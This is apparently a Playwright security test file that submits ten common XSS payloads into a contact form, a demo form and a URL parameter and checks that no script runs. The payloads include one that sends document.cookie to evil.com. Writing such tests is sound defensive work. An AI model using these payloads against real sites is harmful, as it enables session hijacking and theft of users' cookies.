/**
 * ST-862: REQ-112 -- XSS Security E2E Tests
 *
 * Submits common XSS payloads in form fields and verifies no script
 * execution occurs. Tests both the contact form and demo request form.
 */

import { test, expect } from "@playwright/test";

// Common XSS payloads to test
const XSS_PAYLOADS = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert("xss")>',
  '"><script>alert(document.cookie)</script>',
  "javascript:alert('xss')",
  '<svg onload=alert("xss")>',
  "<body onload=alert('xss')>",
  '"><img src=x onerror=alert(1)>',
  "'-alert(1)-'",
  '<iframe src="javascript:alert(1)">',
  '<div style="background:url(javascript:alert(1))">',
] as const;

test.describe("XSS Protection", () => {
  test.describe("Contact Form - XSS Payloads", () => {
    for (const payload of XSS_PAYLOADS) {
      test(`rejects XSS payload in subject field: ${payload.substring(0, 30)}...`, async ({
        page,
      }) => {
        await page.goto("/contact");

        // Set up a listener for any JavaScript alerts (which would indicate XSS)
        let alertTriggered = false;
        page.on("dialog", async (dialog) => {
          alertTriggered = true;
          await dialog.dismiss();
        });

        // Fill the form with the XSS payload in the subject field
        await page.getByLabel(/first name/i).fill("Test");
        await page.getByLabel(/last name/i).fill("User");
        await page.getByLabel(/email address/i).fill("test@test.com");
        await page.getByLabel(/subject/i).fill(payload);
        await page.getByLabel(/message/i).fill("Test message");

        // Submit the form
        await page.getByRole("button", { name: /send message/i }).click();

        // Wait a moment for any scripts to execute
        await page.waitForTimeout(500);

        // Verify no alert was triggered
        expect(alertTriggered).toBe(false);

        // Verify the payload is not rendered as HTML in the page
        const scriptTags = await page.locator("script:not([type])").count();
        // We expect 0 injected script tags (existing ones have type attributes)
        const pageContent = await page.content();
        expect(pageContent).not.toContain('onerror=alert');
        expect(pageContent).not.toContain("javascript:alert");
      });
    }
  });

  test.describe("Demo Form - XSS Payloads", () => {
    test("XSS payload in email field does not execute", async ({ page }) => {
      await page.goto("/demo");

      let alertTriggered = false;
      page.on("dialog", async (dialog) => {
        alertTriggered = true;
        await dialog.dismiss();
      });

      // Try XSS in the email field
      await page
        .getByLabel(/email address/i)
        .fill('<script>alert("xss")</script>@test.com');
      await page
        .getByLabel('Organization', { exact: true })
        .fill('<img src=x onerror=alert(1)>');

      await page.getByRole("button", { name: /continue/i }).click();
      await page.waitForTimeout(500);

      expect(alertTriggered).toBe(false);
    });

    test("XSS payload in message field does not execute", async ({ page }) => {
      await page.goto("/demo");

      let alertTriggered = false;
      page.on("dialog", async (dialog) => {
        alertTriggered = true;
        await dialog.dismiss();
      });

      // Complete Step 1
      await page.getByLabel(/email address/i).fill("test@school.edu");
      await page.getByLabel('Organization', { exact: true }).fill("Test School");
      await page.getByRole("button", { name: /continue/i }).click();

      // Fill Step 2 with XSS payload in message
      await page.getByLabel(/first name/i).fill("Test");
      await page.getByLabel(/last name/i).fill("User");
      await page.getByLabel(/organization type/i).selectOption("k12");
      await page
        .getByLabel(/message/i)
        .fill(
          '<script>document.location="https://evil.com?c="+document.cookie</script>',
        );

      await page.waitForTimeout(500);
      expect(alertTriggered).toBe(false);
    });
  });

  test.describe("URL Parameter XSS", () => {
    test("XSS in URL query parameter does not execute", async ({ page }) => {
      let alertTriggered = false;
      page.on("dialog", async (dialog) => {
        alertTriggered = true;
        await dialog.dismiss();
      });

      await page.goto('/?q=<script>alert("xss")</script>');
      await page.waitForTimeout(500);

      expect(alertTriggered).toBe(false);
    });
  });
});
